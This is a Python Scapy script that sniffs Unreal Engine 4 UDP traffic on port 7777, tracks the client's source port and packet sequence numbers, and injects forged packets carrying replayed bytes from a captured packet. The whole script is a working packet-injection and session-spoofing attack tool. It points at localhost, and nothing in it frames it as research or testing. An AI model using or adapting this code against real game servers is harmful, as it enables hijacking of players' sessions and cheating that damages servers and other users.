from scapy.all import *
import ue4lib
import time     #This is for sleep

# bytes_data is copy of bunches
# This copy is from captured packet
bytes_data=[0xFF, 0xFF, 0xFF, 0xFF, 0x02, 0x60, 0x80, 0x5E, 0xE0, 0x95, 0x00, 0xB9, 0x22, 0x10, 0x00, 0x00]
bytes_data.extend([0xF8, 0x2F, 0x50, 0xC3, 0xE7, 0x71, 0xEC, 0x97, 0x12, 0xCA, 0x92, 0x0C, 0xF0, 0xAF, 0xC1, 0x03])
bytes_data.extend([0x60, 0x80, 0x5E, 0xE0, 0x95, 0x00, 0xB9, 0x22, 0xF0, 0xE2, 0x36, 0x1A, 0x27, 0x50, 0xC3, 0xE7])
bytes_data.extend([0x71, 0xEC, 0x97, 0x12, 0xCA, 0x92, 0x0C, 0xF0, 0xAF, 0xC1, 0x03])

# s is client port
# server port is 7777
s=0

def showPacket(packet):  
    global s
    if packet[UDP].dport==7777:
        s=packet[UDP].sport


    if packet.haslayer(Raw):
        data=bytes(packet[UDP].payload)

        reader=ue4lib.MessageReader(data)

        handshake_packet = reader.read_bit()
        handshake_restart = reader.read_bit()
        _active_secret = reader.read_bit()

        _timestamp = reader.read_float()

        _cookie = reader.read_bits(reader.bits_remaining())
        print("Client seq: ",end='')
        _client_seq=struct.unpack("<H", _cookie[:2])[0] & 0x3fff
        print(_client_seq)
        print("Server seq: ",end='')
        _server_seq=struct.unpack("<H", _cookie[2:4])[0] & 0x3fff
        print(_server_seq)

def trackPacket(packet):
    global s
    if packet[UDP].dport==7777 and packet[UDP].sport==s:
        if packet.haslayer(Raw):
            data=bytes(packet[UDP].payload)

            reader=ue4lib.MessageReader(data)

            reader._consume_bits(5)

            ss=struct.unpack("<H", reader.read_bits_(14))[0] & 0x3fff
            cs=struct.unpack("<H", reader.read_bits_(14))[0] & 0x3fff

            send_packet(cs+1, ss)
            print("client seq: ",end='')
            print(cs)
            print("server seq: ",end='')
            print(ss)
            time.sleep(0.1)

def send_packet(client_seq, server_seq):
    global s
    global bytes_data

    outermsg = ue4lib.MessageWriter(padded = True)
    outermsg.write_bit(0)

    msg = ue4lib.MessageWriter(padded = True)

    for _ in range(0, 4):
        msg.write_bit(0)

    seq_str = struct.pack("<H", client_seq)
    acked_seq_str = struct.pack("<H", (server_seq) & 0xFFFF)

    msg.write_buffer(acked_seq_str, 14)
    msg.write_buffer(seq_str, 14)

    for _ in bytes_data:
        msg.write_byte(_)

    output = msg.output()
    outermsg.write_buffer(output, len(output) * 8)
    print(outermsg.output())

    send(IP(dst="127.0.0.1")/UDP(dport=7777, sport=s)/outermsg.output())

def sniffing1(filter):  
    sniff(filter = filter, prn = showPacket, count = 2, store = 2)  

def sniffing2(filter):  
    sniff(filter = filter, prn = trackPacket, count = 0)  

filter = "udp port 7777"
# Sniff Handshake packet
sniffing1(filter)  

# Wait until handshake exit
time.sleep(0.5)

# Sniff Data packet
sniffing2(filter)
